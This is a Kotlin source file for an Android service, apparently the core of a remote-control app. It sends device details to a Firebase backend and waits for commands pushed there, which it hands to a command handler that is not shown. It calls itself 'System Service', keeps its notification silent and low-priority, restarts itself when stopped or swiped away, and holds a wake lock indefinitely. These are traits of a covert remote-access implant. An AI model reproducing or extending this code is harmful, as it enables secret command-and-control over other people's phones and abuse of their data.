package com.sanz.epep.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.sanz.epep.App
import com.sanz.epep.data.local.PrefsManager
import com.sanz.epep.data.remote.FirebaseResponder
import com.sanz.epep.domain.CommandHandler
import com.sanz.epep.ui.SetupActivity
import kotlinx.coroutines.*

class FirebaseListenerService : Service() {

    companion object {
        private const val TAG = "FirebaseService"
        private const val NOTIFICATION_ID = 1001
        private var isRunning = false

        fun isServiceRunning() = isRunning

        fun start(context: Context) {
            try {
                if (isRunning) return
                val intent = Intent(context, FirebaseListenerService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
                Log.d(TAG, "Service start requested")
            } catch (e: Exception) {
                Log.e(TAG, "Start failed: ${e.message}")
            }
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, FirebaseListenerService::class.java))
        }
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var commandHandler: CommandHandler? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var commandListener: ValueEventListener? = null
    private var commandRef: DatabaseReference? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "onCreate")
        PrefsManager.init(this)
        commandHandler = CommandHandler(this)
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand — deviceId: ${PrefsManager.deviceId}")
        startForeground(NOTIFICATION_ID, createNotification())
        isRunning = true
        startListening()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.d(TAG, "onDestroy")
        isRunning = false
        commandListener?.let { commandRef?.removeEventListener(it) }
        scope.cancel()
        commandHandler?.destroy()
        releaseWakeLock()
        super.onDestroy()
        restart()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        restart()
        super.onTaskRemoved(rootIntent)
    }

    private fun restart() {
        try {
            val intent = Intent(this, FirebaseListenerService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (_: Exception) {}
    }

    private fun startListening() {
        try {
            val deviceId = PrefsManager.deviceId
            val db = FirebaseDatabase.getInstance(PrefsManager.FIREBASE_URL)

            // Listen perintah di path per device
            commandRef = db.getReference("devices/$deviceId/command")

            // Kirim info device + status online saat startup
            scope.launch {
                val model = "${Build.MANUFACTURER} ${Build.MODEL}"
                val androidVer = "Android ${Build.VERSION.RELEASE}"
                val label = PrefsManager.deviceLabel.ifEmpty { model }

                FirebaseResponder.sendDeviceInfo(mapOf(
                    "label" to label,
                    "model" to model,
                    "android" to androidVer,
                    "device_id" to deviceId,
                    "online" to true,
                    "last_seen" to System.currentTimeMillis()
                ))

                FirebaseResponder.sendStatus(mapOf(
                    "online" to true,
                    "battery" to -1,
                    "locked" to false,
                    "panic" to false,
                    "timestamp" to System.currentTimeMillis()
                ))

                FirebaseResponder.sendResponse("✅ System Service aktif!\n📱 $model — $androidVer\n🔑 ID: $deviceId")
            }

            commandListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val cmd = snapshot.getValue(String::class.java) ?: return
                    if (cmd == "null" || cmd.isBlank()) return

                    Log.d(TAG, "Command: $cmd")
                    commandRef?.setValue(null) // clear dulu

                    scope.launch(Dispatchers.Main) {
                        try {
                            commandHandler?.handleCommand(cmd)
                        } catch (e: Exception) {
                            Log.e(TAG, "Handler error: ${e.message}")
                        }
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e(TAG, "Firebase error: ${error.message}")
                }
            }

            commandRef?.addValueEventListener(commandListener!!)
            Log.d(TAG, "Listening at: devices/$deviceId/command")

        } catch (e: Exception) {
            Log.e(TAG, "startListening error: ${e.message}")
        }
    }

    private fun createNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, SetupActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pi)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "epep::WL")
                .apply { acquire(Long.MAX_VALUE) }
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try { wakeLock?.let { if (it.isHeld) it.release() } } catch (_: Exception) {}
        wakeLock = null
    }
}
